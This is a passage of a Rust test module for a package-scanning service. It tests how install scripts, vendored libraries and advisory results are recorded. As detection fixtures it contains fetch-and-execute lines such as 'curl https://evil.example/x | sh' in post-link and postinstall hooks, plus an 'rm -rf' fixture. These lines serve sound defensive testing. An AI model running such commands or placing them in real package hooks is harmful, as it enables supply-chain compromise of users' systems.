        first.script_files = vec![(
            "bin/.pkg-post-link.sh".to_string(),
            b"#!/bin/sh\necho hi\n".to_vec(),
        )];
        // An un-analysed script too: it is written by a DIFFERENT insert, so a
        // replace that forgot one table would strand this row specifically.
        first.unanalyzed_scripts = vec![UnanalyzedScript {
            script: conda_scripts::make_inline_script(
                ScriptKind::RpmPost,
                "rpm:scriptlet/%post",
                "-- lua\n",
            ),
            original_size_bytes: 8,
            reason: "declared interpreter /usr/bin/lua is not analysed".to_string(),
        }];
        record_analysis(&pool, first).await.expect("first run");
        assert_eq!(component_rows(&pool, artifact).await.len(), 2);
        assert_eq!(script_rows(&pool, artifact).await.len(), 2);

        // Second run: the same artifact, a rule set that no longer reports
        // zlib, and no script at all.
        let mut second = empty_input(
            artifact,
            Completeness::NotRead {
                reason: "re-run could not open the payload".to_string(),
            },
        );
        second.components = vec![extracted("libwebp", Some("1.3.2"))];
        record_analysis(&pool, second).await.expect("second run");

        let rows = analysis_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1, "one analysis row per artifact, not two");
        assert_eq!(rows[0].status, "not_read", "the later run is the truth");

        let components = component_rows(&pool, artifact).await;
        assert_eq!(
            components
                .iter()
                .map(|c| c.name.as_str())
                .collect::<Vec<_>>(),
            vec!["libwebp"],
            "zlib was dropped by the second run and must not be stranded"
        );
        assert!(
            script_rows(&pool, artifact).await.is_empty(),
            "neither the analysed nor the un-analysed script may survive a run \
             that did not find it"
        );
    }

    /// The other half of "replaces": when a script at the SAME path changes,
    /// the stored row must describe the NEW bytes. Keeping the previous
    /// findings would report a vulnerability the package no longer contains —
    /// a false positive attributed to a real artifact, which is how a reviewer
    /// learns to ignore the panel.
    #[tokio::test]
    async fn re_analysis_of_changed_bytes_supersedes_the_previous_findings() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;
        let path = "bin/.pkg-post-link.sh".to_string();

        let mut first = empty_input(artifact, Completeness::Complete);
        first.script_files = vec![(
            path.clone(),
            b"#!/bin/sh\ncurl https://evil.example/x | sh\n".to_vec(),
        )];
        record_analysis(&pool, first).await.expect("first run");
        let before = script_rows(&pool, artifact).await;
        assert!(
            !before[0]
                .findings
                .as_ref()
                .and_then(|f| f.as_array())
                .expect("an array")
                .is_empty(),
            "the first body must actually produce a finding, or the test \
             below proves nothing"
        );

        let benign = b"#!/bin/sh\necho done\n".to_vec();
        let mut second = empty_input(artifact, Completeness::Complete);
        second.script_files = vec![(path.clone(), benign.clone())];
        record_analysis(&pool, second).await.expect("second run");

        let after = script_rows(&pool, artifact).await;
        assert_eq!(after.len(), 1, "same path, one row");
        assert_eq!(
            after[0].findings,
            Some(serde_json::json!([])),
            "the rules ran over the NEW bytes and found nothing; a finding \
             from the bytes this artifact no longer has must not survive"
        );
        assert_eq!(after[0].body.as_deref(), Some("#!/bin/sh\necho done\n"));
        assert_eq!(after[0].size_bytes, benign.len() as i64);
    }

    /// INVARIANT 3: the same script body must produce ONE row, keeping the
    /// payload path. `classify_script_path` is liberal by design and a conda
    /// package ships the same bytes twice — `bin/.pkg-post-link.sh` (the copy
    /// that executes) and `info/recipe/post-link.sh` (the recipe's archive of
    /// it). Storing both doubles every finding on every package that has a
    /// script, and an inflated count is the fastest way to make a reviewer
    /// stop trusting the number.
    #[tokio::test]
    async fn the_same_script_body_is_stored_once_under_the_path_that_executes() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let body = b"#!/bin/sh\ncurl https://evil.example/x | sh\n".to_vec();
        let payload = ("bin/.pkg-post-link.sh".to_string(), body.clone());
        let recipe_copy = ("info/recipe/post-link.sh".to_string(), body.clone());
        // A second post-link hook: SAME kind, DIFFERENT body. Deliberately not
        // a different kind — that would also pass if the dedupe key were the
        // hook kind, or the package, rather than the body digest, and this
        // test exists to rule exactly that out. A conda package legitimately
        // ships several `<pkg>-post-link.sh` scripts.
        let other = (
            "bin/.otherpkg-post-link.sh".to_string(),
            b"#!/bin/sh\necho preparing\n".to_vec(),
        );
        assert!(conda_scripts::classify_script_path(&other.0).is_some());
        assert_ne!(other.1, body, "the survivor must differ in its BODY");

        // Guard against this test passing for the wrong reason: if the
        // classifier stopped matching the recipe's copy there would be nothing
        // to deduplicate, and "one row" below would prove nothing.
        assert!(conda_scripts::classify_script_path(&payload.0).is_some());
        assert!(conda_scripts::classify_script_path(&recipe_copy.0).is_some());

        // Both arrival orders: the dedupe must not depend on which copy the
        // format handler happened to list first.
        for files in [
            vec![payload.clone(), recipe_copy.clone(), other.clone()],
            vec![other.clone(), recipe_copy.clone(), payload.clone()],
        ] {
            let artifact = seed_artifact(&pool).await;
            let mut input = empty_input(artifact, Completeness::Complete);
            input.script_files = files;
            // A path that is not an install script at all is ignored, so a
            // caller may hand over the whole file list.
            input
                .script_files
                .push(("info/index.json".to_string(), b"{}".to_vec()));
            record_analysis(&pool, input).await.expect("record scripts");

            let rows = script_rows(&pool, artifact).await;
            assert_eq!(
                rows.iter().map(|r| r.path.as_str()).collect::<Vec<_>>(),
                vec!["bin/.otherpkg-post-link.sh", "bin/.pkg-post-link.sh"],
                "one row per BODY: the recipe's duplicate collapses into the \
                 payload copy that executes at install time, while a second \
                 post-link hook with different bytes survives alongside it"
            );
            assert_eq!(rows[0].kind, "post-link");
            assert_eq!(rows[1].kind, "post-link");
            assert_eq!(rows[1].size_bytes, body.len() as i64);

            // The stored findings use the PUBLISHED field names, not the
            // analyzer's; the web client parses these keys.
            let findings = rows[1].findings.clone().expect("findings, not NULL");
            let findings = findings.as_array().expect("an array").clone();
            assert!(
                !findings.is_empty(),
                "`curl | sh` in a post-link script must not analyse as clean"
            );
            let first = &findings[0];
            assert!(first.get("rule_id").is_some(), "published as rule_id");
            assert!(first.get("snippet").is_some(), "published as snippet");
            assert_eq!(
                first["title"]
                    .as_str()
                    .map(|t| t.starts_with(char::is_uppercase)),
                Some(true),
                "the rule id is humanised into a short label"
            );
        }
    }

    /// INVARIANT 4, half one: an un-analysed script stores `findings = NULL`
    /// plus a reason, which is a different fact from `findings = []`.
    ///
    /// INVARIANT 5: `original_size_bytes` is the ON-DISK count, not
    /// `body.len()`. For a lossy decode they differ — `U+FFFD` is three bytes,
    /// so these four undecodable bytes would otherwise be recorded as twelve,
    /// a wrong number in a numeric column that nothing downstream can tell is
    /// wrong.
    #[tokio::test]
    async fn an_unanalyzed_script_stores_null_findings_and_the_on_disk_size() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let raw: &[u8] = b"\xff\xfe\xff\xfe";
        let body = String::from_utf8_lossy(raw).into_owned();
        assert_eq!(body.len(), 12, "the lossy body is three times the file");

        let mut input = empty_input(artifact, Completeness::Complete);
        input.unanalyzed_scripts = vec![UnanalyzedScript {
            script: conda_scripts::make_inline_script(
                ScriptKind::RpmPre,
                "rpm:scriptlet/%pre",
                &body,
            ),
            original_size_bytes: raw.len() as i64,
            reason: "declared interpreter /usr/bin/lua is not analysed".to_string(),
        }];
        record_analysis(&pool, input).await.expect("record");

        let rows = script_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].kind, "rpm-pre");
        assert_eq!(
            rows[0].findings, None,
            "NULL means 'we did not run the rules', never 'nothing matched'"
        );
        assert_eq!(
            rows[0].skipped_reason.as_deref(),
            Some("declared interpreter /usr/bin/lua is not analysed")
        );
        assert_eq!(
            rows[0].size_bytes, 4,
            "the on-disk count, not the 12-byte lossy decode"
        );
        assert_eq!(rows[0].body.as_deref(), Some(body.as_str()));
    }

    /// INVARIANT 4, half two: the pairing is not merely a convention this
    /// module follows — the DB refuses a reason-less un-analysed row, so no
    /// future writer can store "unexamined" without saying why.
    #[tokio::test]
    async fn the_database_rejects_an_unanalyzed_script_with_no_reason() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let err = sqlx::query(
            "INSERT INTO package_install_scripts \
               (artifact_id, path, kind, size_bytes, sha256, body, findings, \
                analysis_skipped_reason) \
             VALUES ($1, 'bin/.pkg-post-link.sh', 'post-link', 1, 'deadbeef', NULL, NULL, NULL)",
        )
        .bind(artifact)
        .execute(&pool)
        .await
        .expect_err("a NULL findings with no reason must be rejected");
        assert!(
            err.to_string()
                .contains("package_install_scripts_skip_reason_present"),
            "expected the CHECK constraint to fire, got: {err}"
        );
    }

    /// INVARIANT 6: a recipe that fails to parse must not fail ingest — the
    /// package is real and its scripts still matter — and must not look like
    /// "no vendored components" either. The failure is logged; the list stays
    /// empty while `completeness` keeps saying what it always said.
    #[tokio::test]
    async fn an_unparsable_recipe_neither_fails_ingest_nor_rewrites_completeness() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let mut input = empty_input(
            artifact,
            Completeness::Partial {
                reason: "one entry exceeded the per-file ceiling".to_string(),
                files_read: 4,
                files_total: 5,
            },
        );
        // A YAML sequence where the parser requires a mapping.
        input.recipe_files = vec![(
            "info/recipe/meta.yaml".to_string(),
            b"- not\n- a\n- recipe\n".to_vec(),
        )];
        input.script_files = vec![(
            "bin/.pkg-pre-unlink.sh".to_string(),
            b"#!/bin/sh\nrm -rf /opt/thing\n".to_vec(),
        )];

        record_analysis(&pool, input)
            .await
            .expect("an unparsable recipe must not fail ingest");

        let rows = analysis_rows(&pool, artifact).await;
        assert_eq!(rows[0].status, "partial", "completeness is untouched");
        assert_eq!(
            (rows[0].files_read, rows[0].files_total),
            (Some(4), Some(5))
        );
        assert!(
            component_rows(&pool, artifact).await.is_empty(),
            "an empty list here means 'we could not read the recipe', which \
             the 'partial' status is what makes legible"
        );
        assert_eq!(
            script_rows(&pool, artifact).await.len(),
            1,
            "the scripts are still worth reporting"
        );
    }

    /// A source whose template expression could not be evaluated is still
    /// stored, with `confidence = unresolved` and no version. "A source exists
    /// and we could not pin it" is materially different from "this package
    /// vendors nothing", and only a row can say the first one.
    #[tokio::test]
    async fn a_source_with_an_unevaluated_template_is_stored_as_unresolved() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        // The raw conda-build template, which a package only ships when the
        // rendered recipe is absent: the Jinja is unevaluated.
        let template = "package:\n  name: foo\n  version: '1.0'\nsource:\n                          url: https://example.invalid/{{ pinned_elsewhere }}/foo.tar.gz\n";
        let mut input = empty_input(artifact, Completeness::Complete);
        input.recipe_files = vec![(
            "info/recipe/meta.yaml.template".to_string(),
            template.into(),
        )];
        record_analysis(&pool, input).await.expect("record");

        let rows = component_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1, "an unpinnable source is still a source");
        assert_eq!(rows[0].confidence, "unresolved");
        assert_eq!(rows[0].version, None);
        assert_eq!(rows[0].purl, None, "nothing to match a CVE against");
        assert_eq!(
            rows[0].detection_method.as_deref(),
            Some("recipe:info/recipe/meta.yaml.template"),
            "a component from the raw template deserves less trust than one \
             from the rendered recipe, and the file name is what records that"
        );
    }

    /// Recipe-derived and caller-extracted components share one table and one
    /// identity (name + version): the same library seen two ways is one row,
    /// and the recipe's provenance survives the caller's duplicate.
    #[tokio::test]
    async fn recipe_and_caller_components_merge_on_name_and_version() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let mut libwebp = extracted("libwebp", None);
        libwebp.soname = Some("libwebp.so.7.1.3".to_string());
        libwebp.abi_version = Some("7.1.3".to_string());
        libwebp.detection_method = "wheel:libs-dir".to_string();
        libwebp.applied_patches = vec!["0003-fix-oob-read.patch".to_string()];

        let mut input = empty_input(artifact, Completeness::Complete);
        input.recipe_files = vec![("info/recipe/meta.yaml".to_string(), META_YAML.into())];
        // The caller also claims pillow 10.2.0 — the same component the recipe
        // declared, not a second one.
        input.components = vec![extracted("pillow", Some("10.2.0")), libwebp];
        record_analysis(&pool, input).await.expect("record");

        let rows = component_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 2, "pillow is one component seen two ways");

        let webp = &rows[0];
        assert_eq!(webp.name, "libwebp");
        assert_eq!(
            webp.version, None,
            "an ABI number is never promoted into version: libwebp.so.7 ships \
             in libwebp 1.2.4, and a CVE matcher would match it confidently \
             and wrongly"
        );
        assert_eq!(webp.abi_version.as_deref(), Some("7.1.3"));
        assert_eq!(webp.soname.as_deref(), Some("libwebp.so.7.1.3"));
        assert_eq!(webp.confidence, "inferred");
        assert_eq!(webp.detection_method.as_deref(), Some("wheel:libs-dir"));
        assert_eq!(
            webp.applied_patches,
            serde_json::json!([{ "name": "0003-fix-oob-read.patch" }]),
            "a caller-extracted component's patches travel with it too"
        );

        let pillow = &rows[1];
        assert_eq!(pillow.version.as_deref(), Some("10.2.0"));
        assert_eq!(pillow.purl.as_deref(), Some("pkg:generic/pillow@10.2.0"));
        assert_eq!(
            pillow.sha256.as_deref(),
            Some("e87f0b2c78157e12d7686b27d63c070fd65d994e8ddae6f328e0dcf4a0cd007e")
        );
        assert_eq!(pillow.confidence, "declared");
        assert_eq!(
            pillow.detection_method.as_deref(),
            Some("recipe:info/recipe/meta.yaml"),
            "which file the component came from is the provenance a reader \
             needs, and the caller's later duplicate must not overwrite it"
        );
        assert_eq!(
            pillow.applied_patches,
            serde_json::json!([{ "name": "0001-fix-cve-2023-4863.patch" }]),
            "a backported fix showing up as the unpatched upstream version is \
             exactly the false positive the patch list exists to prevent"
        );
    }

    /// INVARIANT (#4046): binary-derived components land in the same table but
    /// are VISIBLE as a different class of evidence from recipe-derived ones —
    /// never above `inferred`, always named by their detection method — and
    /// they are recorded only for packages whose recipe said nothing. The
    /// false-positive rate of banner matching is real (measured in
    /// `binary_catalog`'s corpus), so a package with a recipe that speaks is
    /// not second-guessed by its bytes.
    #[tokio::test]
    async fn binary_derived_components_are_recorded_with_visible_lower_confidence() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let mut webp = extracted("libwebp", Some("1.3.2"));
        webp.soname = Some("libwebp.so.7.1.3".to_string());
        webp.abi_version = Some("7.1.3".to_string());
        webp.confidence = SourceConfidence::Inferred;
        webp.detection_method = "binary:soname+banner:banner-libwebp-v1".to_string();

        // A recipe-less package: no recipe_files at all.
        let mut input = empty_input(artifact, Completeness::Complete);
        input.components = vec![webp];
        record_analysis(&pool, input).await.expect("record");

        let rows = component_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].name, "libwebp");
        assert_eq!(rows[0].version.as_deref(), Some("1.3.2"));
        assert_eq!(
            rows[0].confidence, "inferred",
            "binary-derived evidence never reaches 'declared', the recipe's tier"
        );
        assert_eq!(
            rows[0].detection_method.as_deref(),
            Some("binary:soname+banner:banner-libwebp-v1"),
            "the method names both signals and the rule — a reader can tell \
             this row came from the bytes, not from a recipe"
        );
        assert_eq!(rows[0].soname.as_deref(), Some("libwebp.so.7.1.3"));
        assert_eq!(rows[0].abi_version.as_deref(), Some("7.1.3"));
    }

    /// The two classes must not be flattened into one list: on one artifact, a
    /// recipe-derived component and a binary-derived one are distinguishable
    /// on every row by the pair (confidence, detection_method).
    #[tokio::test]
    async fn a_recipe_with_no_sources_does_not_suppress_binary_components() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        // A recipe that parses but declares NO sources — the binary residue
        // case: the package ships a recipe-shaped file that says nothing
        // about what it vendors, so the bytes speak.
        let no_source_recipe = "package:\n  name: curl\n  version: '8.5.0'\n";
        let mut ssl = extracted("openssl", Some("1.1.1w"));
        ssl.confidence = SourceConfidence::Inferred;
        ssl.detection_method = "binary:banner:banner-openssl-v1".to_string();

        let mut input = empty_input(artifact, Completeness::Complete);
        input.recipe_files = vec![("info/recipe/meta.yaml".to_string(), no_source_recipe.into())];
        input.components = vec![ssl];
        record_analysis(&pool, input).await.expect("record");

        let rows = component_rows(&pool, artifact).await;
        assert_eq!(
            rows.len(),
            1,
            "a recipe with no sources does not suppress the binary evidence"
        );
        assert_eq!(rows[0].confidence, "inferred");
        assert!(rows[0]
            .detection_method
            .as_deref()
            .is_some_and(|m| m.starts_with("binary:")));
    }

    /// When the recipe DOES declare sources, binary-derived components are
    /// suppressed: the recipe is the stronger evidence, and the banner
    /// technique's false-positive rate is a price paid only where there is no
    /// recipe to read.
    #[tokio::test]
    async fn a_recipe_that_declares_sources_suppresses_binary_derived_components() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let mut ssl = extracted("openssl", Some("1.1.1w"));
        ssl.confidence = SourceConfidence::Inferred;
        ssl.detection_method = "binary:banner:banner-openssl-v1".to_string();

        let mut input = empty_input(artifact, Completeness::Complete);
        input.recipe_files = vec![("info/recipe/meta.yaml".to_string(), META_YAML.into())];
        input.components = vec![ssl];
        record_analysis(&pool, input).await.expect("record");

        let rows = component_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1, "only the recipe's component survives");
        assert_eq!(rows[0].name, "pillow");
        assert_eq!(rows[0].confidence, "declared");
        assert_eq!(
            rows[0].detection_method.as_deref(),
            Some("recipe:info/recipe/meta.yaml")
        );
    }

    /// A script whose bytes are not UTF-8 still EXISTS and still runs, so it
    /// is recorded with a NULL body — which the API renders as
    /// `content_available: false` and the UI as "contents could not be read",
    /// never as "no findings".
    #[tokio::test]
    async fn a_non_utf8_script_is_recorded_with_no_body_rather_than_dropped() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let mut input = empty_input(artifact, Completeness::Complete);
        input.script_files = vec![(
            "bin/.pkg-pre-link.sh".to_string(),
            vec![0xff, 0xfe, 0x00, 0x01],
        )];
        record_analysis(&pool, input).await.expect("record");

        let rows = script_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 1, "an unreadable script is not a dropped one");
        assert_eq!(rows[0].body, None);
        assert_eq!(rows[0].kind, "unknown");
        assert_eq!(
            rows[0].findings,
            Some(serde_json::json!([])),
            "the rules DID run over the bytes and found nothing they could \
             read; that is an empty array, not the NULL of an unexamined script"
        );
        assert_eq!(rows[0].size_bytes, 4);
    }

    /// [`record_install_scripts`] is the wiring every non-conda format shares.
    /// It must reach the same table with the same guarantees, including a
    /// required `completeness` — the point of having one path instead of four
    /// near-identical copies.
    #[tokio::test]
    async fn record_install_scripts_wires_manifest_hooks_through_the_same_path() {
        let Some(pool) = try_pool().await else {
            return;
        };
        let artifact = seed_artifact(&pool).await;

        let hook = conda_scripts::make_inline_script(
            ScriptKind::PostInstall,
            "package.json#scripts.postinstall",
            "curl -s https://evil.example/i.sh | sh",
        );
        let skipped = UnanalyzedScript {
            script: conda_scripts::make_inline_script(
                ScriptKind::DebPostInst,
                "control.tar/postinst",
                "#!/usr/bin/perl\nprint \"hi\";\n",
            ),
            // Deliberately NOT `body.len()` (28): the on-disk count is what
            // the column holds, and only a different number proves it.
            original_size_bytes: 27,
            reason: "maintainer script declares a Perl interpreter".to_string(),
        };

        record_install_scripts(
            &pool,
            artifact,
            "npm",
            vec![hook.clone()],
            vec![skipped],
            Completeness::Complete,
        )
        .await
        .expect("record_install_scripts");

        assert_eq!(analysis_rows(&pool, artifact).await[0].format, "npm");
        let rows = script_rows(&pool, artifact).await;
        assert_eq!(rows.len(), 2);

        let postinst = &rows[0];
        assert_eq!(postinst.path, "control.tar/postinst");
        assert_eq!(postinst.kind, "deb-postinst");
        assert_eq!(postinst.findings, None);
        assert_eq!(
            postinst.size_bytes, 27,
            "the archive's byte count, not the 28-byte decoded body"
        );

        let postinstall = &rows[1];
        assert_eq!(postinstall.path, "package.json#scripts.postinstall");
        assert_eq!(postinstall.kind, "postinstall");
        assert_eq!(postinstall.body.as_deref(), Some(hook.body.as_str()));
        assert_eq!(
            postinstall.size_bytes,
            hook.body.len() as i64,
            "an inline hook's bytes ARE its body; there is no file on disk"
        );
        let findings = postinstall.findings.clone().expect("findings ran");
        assert!(
            !findings.as_array().expect("an array").is_empty(),
            "`curl | sh` in a postinstall hook is the single most-used vector \
             in published supply-chain attacks and must not analyse as clean"
        );
    }

    /// The read side of vendored CVE matching: which components were asked about,
    /// which were not, and the rule that an empty list is only ever published when
    /// a feed really did answer.
    #[cfg(test)]
    mod vendored_advisory_tests {
        use super::*;

        /// Reuses the enclosing module's fixture chain (`repositories ->
        /// artifacts`) and hands back both ids, because `scan_results` needs the
        /// repository too.
        async fn seed(pool: &PgPool) -> (Uuid, Uuid) {
            let artifact = seed_artifact(pool).await;
            let repo: (Uuid,) = sqlx::query_as("SELECT repository_id FROM artifacts WHERE id = $1")
                .bind(artifact)
                .fetch_one(pool)
                .await
                .expect("artifact has a repository");
            (artifact, repo.0)
        }

        async fn add_component(pool: &PgPool, artifact: Uuid, name: &str, version: Option<&str>) {
            sqlx::query(
                "INSERT INTO package_vendored_components \
                   (artifact_id, name, version, confidence, detection_method) \
                 VALUES ($1, $2, $3, 'inferred', 'soname')",
            )
            .bind(artifact)
            .bind(name)
            .bind(version)
            .execute(pool)
            .await
            .expect("insert component");
        }

        /// Insert a completed dependency scan and return its id.
        async fn add_scan(pool: &PgPool, artifact: Uuid, repo: Uuid, completeness: &str) -> Uuid {
            let id = Uuid::new_v4();
            sqlx::query(
                "INSERT INTO scan_results \
                   (id, artifact_id, repository_id, scan_type, status, scan_completeness) \
                 VALUES ($1, $2, $3, 'dependency', 'completed', $4)",
            )
            .bind(id)
            .bind(artifact)
            .bind(repo)
            .bind(completeness)
            .execute(pool)
            .await
            .expect("insert scan");
            id
        }

        /// One `scan_findings` row to insert. A struct rather than a parameter
        /// list because the five strings are all optional-ish and easy to
        /// transpose at a call site, and a transposed `source` would silently
        /// turn a vendored finding into a declared one -- the exact
        /// distinction half these tests exist to pin.
        struct Finding<'a> {
            component: &'a str,
            version: Option<&'a str>,
            cve: Option<&'a str>,
            source: &'a str,
            url: Option<&'a str>,
        }

        async fn add_finding(pool: &PgPool, scan: Uuid, artifact: Uuid, f: Finding<'_>) {
            sqlx::query(
                "INSERT INTO scan_findings \
                   (scan_result_id, artifact_id, severity, title, cve_id, \
                    affected_component, affected_version, source, source_url) \
                 VALUES ($1, $2, 'critical', 'Heap buffer overflow', $3, $4, $5, $6, $7)",
            )
            .bind(scan)
            .bind(artifact)
            .bind(f.cve)
            .bind(f.component)
            .bind(f.version)
            .bind(f.source)
            .bind(f.url)
            .execute(pool)
            .await
            .expect("insert finding");
        }

        fn only(rows: &[ComponentAdvisories], name: &str) -> ComponentAdvisories {
            rows.iter()
                .find(|c| c.component == name)
                .unwrap_or_else(|| panic!("no component {name} in {rows:?}"))
                .clone()
        }

        // -----------------------------------------------------------------------
        // `None` means "nobody asked" -- three ways to get there
        // -----------------------------------------------------------------------

        /// A component whose version could not be recovered is never sent to a
        /// feed, so it can never be reported clean. Note the scan here IS complete
        /// and every other component on it resolves: the `None` comes from the
        /// component, not the scan.
        #[tokio::test]
        async fn version_less_component_is_never_reported_as_clean() {
            let Some(pool) = try_pool().await else {
                return;
            };
            let (artifact, repo) = seed(&pool).await;
            add_component(&pool, artifact, "libjpeg-turbo", None).await;
            add_component(&pool, artifact, "libwebp", Some("1.3.2")).await;
            add_scan(&pool, artifact, repo, "complete").await;

            let report = vendored_advisories(&pool, artifact)
                .await
                .expect("query succeeds");
            assert_eq!(
                report.scan.as_ref().map(|s| s.status),
                Some(AdvisoryScanStatus::Ok),
                "the FEED was fine; this component's `null` is about the \
                 component, and must not be reported as an outage"
            );
            let rows = report.components;

            assert_eq!(
                only(&rows, "libjpeg-turbo").advisories,
                None,
                "a component nothing queried must serialize `null`, never `[]`"
            );
            assert_eq!(
                only(&rows, "libwebp").advisories,
                Some(vec![]),
                "its pinned sibling on the same scan really was asked"
            );
        }

        #[tokio::test]
        async fn an_artifact_with_no_scan_reports_not_queried() {
            let Some(pool) = try_pool().await else {
                return;
            };
            let (artifact, _repo) = seed(&pool).await;
            add_component(&pool, artifact, "libwebp", Some("1.3.2")).await;

            let report = vendored_advisories(&pool, artifact)
                .await
                .expect("query succeeds");
            let scan = report.scan.as_ref().expect("a feed status");
            assert_eq!(scan.status, AdvisoryScanStatus::NotRun);
            assert!(
                scan.reason.is_some(),
                "a status that is not `ok` must carry the sentence explaining it"
            );
            let rows = report.components;

            assert_eq!(
                only(&rows, "libwebp").advisories,
                None,
                "absence of findings before any scan is absence of a QUESTION, \
                 not an answer"
            );
        }

        /// The case the whole distinction exists for. A dependency scan that ran
        /// while OSV was unreachable stores `scan_completeness = 'partial'`; its
        /// empty findings list must not become an emerald "No known advisories".
        #[tokio::test]
        async fn a_partial_scan_never_publishes_a_clean_result() {
            let Some(pool) = try_pool().await else {
                return;
            };
            let (artifact, repo) = seed(&pool).await;
            add_component(&pool, artifact, "libwebp", Some("1.3.2")).await;
            add_scan(&pool, artifact, repo, "partial").await;

            let report = vendored_advisories(&pool, artifact)
                .await
                .expect("query succeeds");
            let scan = report.scan.as_ref().expect("a feed status");
            assert_eq!(
                scan.status,
                AdvisoryScanStatus::Partial,
                "an outage must be reported as an outage, distinct from \
                 `not_run` -- the feed WAS asked"
            );
            assert!(
                scan.reason.is_some(),
                "a status that is not `ok` must carry the sentence explaining it"
            );
            let rows = report.components;

            assert_eq!(
                only(&rows, "libwebp").advisories,
                None,
                "a feed that did not answer has not said `clean`"
            );
        }

        // -----------------------------------------------------------------------
        // `Some` means a feed answered
        // -----------------------------------------------------------------------

        /// CVE-2023-4863 reaching the UI for a library the package declares
        /// nowhere: the empty state this whole feature replaces.
        #[tokio::test]
        async fn a_vendored_advisory_is_attached_to_its_component() {
            let Some(pool) = try_pool().await else {
                return;
            };
            let (artifact, repo) = seed(&pool).await;
            add_component(&pool, artifact, "libwebp", Some("1.3.2")).await;
            add_component(&pool, artifact, "zlib", Some("1.3.1")).await;
            let scan = add_scan(&pool, artifact, repo, "complete").await;
            add_finding(
                &pool,
                scan,
                artifact,
                Finding {
                    component: "libwebp",
                    version: Some("1.3.2"),
                    cve: Some("CVE-2023-4863"),
                    source: "osv.dev (vendored)",
                    url: Some("https://osv.dev/vulnerability/OSV-2023-libwebp"),
                },
            )
            .await;

            let rows = vendored_advisories(&pool, artifact)
                .await
                .expect("query succeeds")
                .components;

            let webp = only(&rows, "libwebp").advisories.expect("queried");
            assert_eq!(
                webp,
                vec![ComponentAdvisory {
                    id: "CVE-2023-4863".to_string(),
                    severity: "critical".to_string(),
                    summary: Some("Heap buffer overflow".to_string()),
                    url: Some("https://osv.dev/vulnerability/OSV-2023-libwebp".to_string()),
                }]
            );
            assert_eq!(
                only(&rows, "zlib").advisories,
                Some(vec![]),
                "the clean sibling is clean, not unknown, and must not inherit \
                 libwebp's advisory"
            );
        }

        /// An advisory with no CVE assigned -- the ordinary case for OSS-Fuzz and
        /// vendor feeds -- still needs an `id`, or the client fails the parse for
        /// the whole artifact.
        #[tokio::test]
        async fn an_advisory_with_no_cve_is_identified_by_its_feed_id() {
            let Some(pool) = try_pool().await else {
                return;
            };
            let (artifact, repo) = seed(&pool).await;
            add_component(&pool, artifact, "libwebp", Some("1.3.2")).await;
            let scan = add_scan(&pool, artifact, repo, "complete").await;
            add_finding(
                &pool,
                scan,
                artifact,
                Finding {
                    component: "libwebp",
                    version: Some("1.3.2"),
                    cve: None,
                    source: "osv.dev (vendored)",
                    url: Some("https://osv.dev/vulnerability/OSV-2023-4863"),
                },
            )
            .await;

            let rows = vendored_advisories(&pool, artifact)
                .await
                .expect("query succeeds")
                .components;
            let webp = only(&rows, "libwebp").advisories.expect("queried");
            assert_eq!(webp.len(), 1);
            assert_eq!(
                webp[0].id, "OSV-2023-4863",
                "recovered from the URL the scanner built out of that same id"
            );
        }

        /// A finding against a DECLARED `libwebp` dependency must not be
        /// re-reported against the vendored copy: different provenance, and the
        /// versions need not be the same one.
        #[tokio::test]
        async fn a_declared_dependency_finding_is_not_reported_as_vendored() {
            let Some(pool) = try_pool().await else {
                return;
            };
            let (artifact, repo) = seed(&pool).await;
            add_component(&pool, artifact, "libwebp", Some("1.3.2")).await;
            let scan = add_scan(&pool, artifact, repo, "complete").await;
            add_finding(
                &pool,
                scan,
                artifact,
                Finding {
                    component: "libwebp",
                    version: Some("1.3.2"),
                    cve: Some("CVE-2023-4863"),
                    source: "osv.dev",
                    url: Some("https://osv.dev/vulnerability/OSV-2023-libwebp"),
                },
            )
            .await;

            let rows = vendored_advisories(&pool, artifact)
                .await
                .expect("query succeeds")
                .components;
            assert_eq!(
                only(&rows, "libwebp").advisories,
                Some(vec![]),
                "only findings carrying the `(vendored)` source marker belong here"
            );
        }

        /// A deduplicated scan row holds no findings of its own. Reading it
        /// directly would report every component of every reused scan as clean.
        #[tokio::test]
        async fn a_reused_scan_resolves_to_the_row_that_holds_the_findings() {
            let Some(pool) = try_pool().await else {
                return;
            };
            let (artifact, repo) = seed(&pool).await;
            add_component(&pool, artifact, "libwebp", Some("1.3.2")).await;

            let original = add_scan(&pool, artifact, repo, "complete").await;
            add_finding(
                &pool,
                original,
                artifact,
                Finding {
                    component: "libwebp",
                    version: Some("1.3.2"),
                    cve: Some("CVE-2023-4863"),
                    source: "osv.dev (vendored)",
                    url: Some("https://osv.dev/vulnerability/OSV-2023-libwebp"),
                },
            )
            .await;

            // A later, deduplicated scan that points back at the first.
            let reused = Uuid::new_v4();
            sqlx::query(
                "INSERT INTO scan_results \
                   (id, artifact_id, repository_id, scan_type, status, \
                    scan_completeness, is_reused, source_scan_id, created_at) \
                 VALUES ($1, $2, $3, 'dependency', 'completed', 'complete', true, $4, \
                         NOW() + INTERVAL '1 minute')",
            )
            .bind(reused)
            .bind(artifact)
            .bind(repo)
            .bind(original)
            .execute(&pool)
            .await
            .expect("insert reused scan");

            let rows = vendored_advisories(&pool, artifact)
                .await
                .expect("query succeeds")
                .components;
